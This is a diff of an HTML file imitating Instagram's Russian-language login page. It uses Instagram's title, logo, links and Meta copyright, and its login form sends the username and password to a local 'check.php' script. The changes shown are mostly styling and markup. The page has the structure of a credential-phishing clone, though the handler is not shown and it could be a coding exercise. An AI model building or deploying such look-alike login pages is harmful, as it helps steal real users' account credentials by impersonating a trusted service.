@@ -7,43 +7,57 @@
 
     <title>Instagram</title>
     <link rel="icon" href="images/icons-insta.png">
+    <link rel="stylesheet" href="styles/all.min.css">
+    <!-- <link rel="stylesheet" href="libs/bootstrap.min.css"> -->
     <link rel="stylesheet" href="styles/style.css">
     <link rel="stylesheet" href="styles/media.css">
 </head>
 
 <body>
+    
     <div class="main-images">
         <div class="container">
+
             <div class="section-1">
                 <img src="images/instagram-B=bg.PNG" alt="" class="images-bg">
-            </div>
+
+                
+          </div> 
 
             <div class="container-2">
                 <div class="section-2">
                     <div class="pervi-blok">
+
                      <a href="" class="logo">
                          <img src="images/logo.png" alt="" class="logo-instagram">
                      </a>
-
+                   <!-- ФОРМА START -->
                      <form action="check.php" method="post" class="form-2">
+                   <div class="container4">
 
                      <input type="text" name="login"
-                      placeholder="Телефон, имя пользователя или ел.адрес" required  class="input-1"  >
-
-                     <input type="password" name="password" placeholder="Пароль"
+                      placeholder="Телефон, имя пользователя или эл.адрес" required  class="input-1" aria-required="true" maxlength="75" value="">
+                     <input type="password" name="password" placeholder="Пароль" autocapitalize="off" value="" aria-label="Пароль"
                       required class="input-2" >
-                     <button class="button">Войти</button>
+                      <!-- BUTTON -->
+                     <button class="button" type="submit">Войти</button>
+                     <!-- BUTTON -->
                      </form>
-
+                   
                      <p class="title-p">ИЛИ</p>
                      <div class="poloska-main">
-                         <div class="poloska">______________</div>
-                         <div class="poloska">______________</div>
-                     </div>
+                         <div class="poloska">___________</div>
+                         <div class="poloska">___________</div>
+                 </div>
+         </div>
+                <!-- ФОРМА END -->
+
 
                      <div class="facebook">
                     
-                         <a href="https://www.facebook.com/" class="facebook-link">Войти через Facebook</a>
+                         <a href="https://www.facebook.com/" class="facebook-link"> <i class="fab fa-facebook-square facebook__iconka"></i>Войти через Facebook
+                           
+                        </a>
                          <a href="https://www.instagram.com/accounts/password/reset/" class="password-not">Забыли пароль?</a>
                          
                      </div>
@@ -52,11 +66,15 @@
                     </div>
 
 
-                    <div class="vtoroy-blok">
-                <p class="title-p2 liker">У вас ещё нет аккаунта?</p>
+                 <div class="vtoroy-blok">
+                <div class="vtoroy-blok__container">
+                <p class="title-p2">У вас ещё нет аккаунта?</p>
                 <a href="https://www.instagram.com/accounts/emailsignup/" class="title-link liker">Зарегистрироваться</a>
                     </div>
-                    
+           </div>
+
+
+
                    <div class="treti-blok">
                        
                        <div class="blok-posledni">
@@ -90,20 +108,25 @@
             <a href="" class="footer-link">Хештеги</a>
             <a href="" class="footer-link">Места</a>
             <a href="" class="footer-link">Instagram Lite</a>
+            <a href="" class="footer-link">Загрузка контактов и лица, не являющиеся пользователями</a>
             
            
         </div>
     </div>
     </footer>
-    <div class="footer-main-2">
-            <a href="" class="footer-link">Танцы</a>
-            <a href="" class="footer-link">Еда и напитки</a>
-            <a href="" class="footer-link">Дом и сад</a>
-            <a href="" class="footer-link">Музыка</a>
-            <a href="" class="footer-link">Изобразительное исскуство</a>
+    <div class="footer__main-2">
+            <a href="" class="footer-link-2">Танцы</a>
+            <a href="" class="footer-link-2">Еда и напитки</a>
+            <a href="" class="footer-link-2">Дом и сад</a>
+            <a href="" class="footer-link-2">Музыка</a>
+            <a href="" class="footer-link-2">Изобразительное исскуство</a>
     </div>
-    <ul class="ul-1">
-        <li class="li-1">© 2022 Instagram from Meta</li>
+
+<div class="footer__main-0">
+
+    <ul class="footer__main-li">
+        <li class="footer__main-link1">© 2022 Instagram from Meta</li>
     </ul>
+</div>
 </body>
 </html>
